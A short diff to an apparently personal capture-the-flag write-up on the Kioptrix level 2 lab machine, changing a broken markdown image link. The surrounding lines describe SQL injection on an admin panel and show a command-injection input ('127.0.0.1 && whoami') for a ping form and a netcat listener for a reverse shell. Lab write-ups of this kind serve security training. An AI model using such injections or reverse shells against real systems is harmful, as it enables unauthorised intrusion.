@@ -72,7 +72,7 @@ This admin panel was vulnerable to SQL Injection, I was able to get inside using
 
 ![index_page](images/kioptrixv2/index_page.png) </br>
 The web server was asking for an address to ping, and this ping utility script was vulnerable to code injection: </br>
-[code_injection](images/kioptrixv2/code_injection.png) </br>
+![code_injection](images/kioptrixv2/code_injection.png) </br>
 To insert an additional command to the ping utility I did this: ```127.0.0.1 && whoami``` </br>
 To gain a reverse shell I did this: </br>
 Kali Linux: ```nc -nlvp 1234``` </br>
